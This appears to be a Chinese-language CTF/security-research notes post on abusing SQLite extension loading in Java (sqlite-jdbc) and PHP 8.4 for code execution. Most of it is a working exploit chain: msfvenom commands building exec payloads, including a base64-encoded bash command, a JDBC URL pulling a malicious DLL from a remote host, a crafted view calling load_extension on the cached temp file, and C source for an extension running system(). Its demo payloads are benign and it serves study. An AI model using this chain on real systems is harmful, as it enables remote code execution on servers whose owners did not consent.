---
date: 2025-11-13
title: sqlite的一些攻击利用
tags:
  - PHP
  - java
---
[[xctf-final]]
[[ciscn-eajava]]
# java
https://conference.hitb.org/files/hitbsecconf2021sin/materials/D1T2%20-%20Make%20JDBC%20Attacks%20Brilliant%20Again%20-%20Xu%20Yuanzhen%20&%20Chen%20Hongkun.pdf
## 环境
```xml
<dependency>
	<groupId>org.xerial</groupId>
	<artifactId>sqlite-jdbc</artifactId>
	<version>3.8.9</version>
</dependency>
```

```java
package sqlite;

import java.sql.Connection;
import java.sql.DriverManager;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import org.sqlite.SQLiteConfig;

public class SqliteDatasourceConnector{
    private Connection connection;

    public SqliteDatasourceConnector(String url) throws ClassNotFoundException, SQLException {
        Class.forName("org.sqlite.JDBC");
        SQLiteConfig config = new SQLiteConfig();
        config.enableLoadExtension(true);
        this.connection = DriverManager.getConnection(url, config.toProperties());
        this.connection.setAutoCommit(true);
    }

    public void getTableContent(String tableName) throws Exception {
        String sql = "select * from " + tableName;
        Statement statement = this.connection.createStatement();
        ResultSet resultSet = statement.executeQuery(sql);
    }
}
```
## attack
首先需要一个恶意的dll文件。
msfvenom -p windows/x64/exec CMD='calc.exe' -f dll -o evil.dll

```java
public class SqliteExp {
    public static void main(String[] args) throws Exception {
    
        SqliteDatasourceConnector sqliteDatasourceConnector = new SqliteDatasourceConnector("jdbc:sqlite::resource:http://192.168.58.132:7777/evil.dll");
        sqliteDatasourceConnector.getTableContent("securit");
    }
}
```

CoreConnection.class
```java
} else {
	String tempFolder = (new File(System.getProperty("java.io.tmpdir"))).getAbsolutePath();
	String dbFileName = String.format("sqlite-jdbc-tmp-%d.db", resourceAddr.hashCode());
	File dbFile = new File(tempFolder, dbFileName);
```
然后会生成一个临时文件。然后我们需要去load
C:\Users\C0cr\AppData\Local\Temp\sqlite-jdbc-tmp-278198310.db

路径固定，名字可知。
```
String so = "http://192.168.58.132:7777/evil.dll";
String url = so;
String filename = "sqlite-jdbc-tmp-"+new URL(url).hashCode()+".db";
System.out.printf(filename);
```
创建一个恶意db文件，创建一个View
`CREATE VIEW securit as SELECT ( SELECT load_extension('C:\\Users\\C0cr\\AppData\\Local\\Temp\\sqlite-jdbc-tmp-278198310.db'));`
最终攻击成功。
```java
SqliteDatasourceConnector sqliteDatasourceConnector = new SqliteDatasourceConnector("jdbc:sqlite::resource:http://192.168.58.132:7777/news.db");
sqliteDatasourceConnector.getTableContent("securit");
```

## linux
msfvenom -p linux/x64/exec CMD='echo dG91Y2ggL3RtcC9oYWNrZXIK|base64 -d|bash' -f elf-so -o evil.so

db缓存文件再 /tmp目录下。
```
root@un:~
> ls /tmp
sqlite-jdbc-tmp-1094285271.db
sqlite-jdbc-tmp--2124722348.db
```

# PHP8.4
https://www.php.net/manual/zh/pdo-sqlite.loadextension.php
想要使用这些扩展需要安装一些内容。
```
# 1. 安装系统依赖
apt install -y sqlite3 libsqlite3-dev
# 2. 安装PHP扩展
apt install -y php8.4-sqlite3
# 3. 重启PHP-FPM
systemctl restart php8.4-fpm
# 4. 验证
php -m | grep sqlite
```

https://github.com/docker-library/php/blob/master/8.1/trixie/apache/Dockerfile
但是官方的docker环境8+都默认配置了这些。
```
RUN set -eux; \
	\
	savedAptMark="$(apt-mark showmanual)"; \
	apt-get update; \
	apt-get install -y --no-install-recommends \
    .........
		libsqlite3-dev \
	./configure \
	................
	# always build against system sqlite3 (https://github.com/php/php-src/commit/6083a387a81dbbd66d6316a3a12a63f06d5f7109)
			--with-pdo-sqlite=/usr \
			--with-sqlite3=/usr \
```
但是还是要求php >= 8.4才能使用这个类。
https://www.php.net/manual/zh/class.pdo-sqlite.php
直接去load就行了。
```
> cat test.php
<?php

$db = new Pdo\Sqlite('sqlite::memory:');
$db->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
$db->loadExtension('/var/www/html/exp.so');
```
至于为什么要用pdo
https://www.php.net/manual/zh/sqlite3.loadextension.php
因为原版的需要去配置so文件的目录，有一定限制。

# 恶意so
然后根据文档来编译一个恶意so文件。
https://sqlite.org/loadext.html
```c
> cat exp.c
#include <sqlite3ext.h>
#include <stdlib.h>  // 用于 system() 函数
SQLITE_EXTENSION_INIT1

#ifdef _WIN32
__declspec(dllexport)
#endif
int sqlite3_exp_init(
  sqlite3 *db,
  char **pzErrMsg,
  const sqlite3_api_routines *pApi
){
  int rc = SQLITE_OK;
  SQLITE_EXTENSION_INIT2(pApi);

  /* 在这里执行系统命令 */
  system("touch /tmp/aaaaa");
  system("echo 'Hello from SQLite extension' > /tmp/bbbbb");

  return rc;
}
```
然后上传load即可。
 gcc -g -fPIC -shared exp.c -o exp.so

windows下面的话需要使用的是dll文件
`C:\myapps\mingw64\bin\x86_64-w64-mingw32-gcc -shared -o exp.dll exp.c`

# else
其它语言的话，应该也会有利用方式。